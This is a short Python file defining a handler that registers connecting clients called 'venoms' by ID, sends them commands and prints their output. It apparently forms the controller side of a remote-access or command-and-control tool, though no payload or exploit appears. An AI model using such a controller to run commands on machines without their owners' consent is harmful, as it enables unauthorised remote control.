import socket

from commands import Command
from venom import Venom


class VenomHandler:
    RECV_SIZE = 8192

    def __init__(self):
        self.venoms = list()

    def handle(self, venom_socket: socket.socket, venom_address: tuple):
        print(f"Handling venom: {venom_address}")
        venom_id = venom_socket.recv(self.RECV_SIZE).strip()
        print(f"The received venom id is: {venom_id}")
        venom = Venom(venom_socket, venom_address, venom_id.decode())
        if venom not in self.venoms:
            self.venoms.append(venom)

    def send_command(self, venom_id: str, command: Command):
        for venom in self.venoms:
            if venom.venom_id == venom_id:
                print("Found venom! sending command...")
                command = command.build_command()
                venom.venom_socket.send(command)
                print("Command sent successfully")
                output = venom.venom_socket.recv(self.RECV_SIZE).strip()
                print(output.decode())
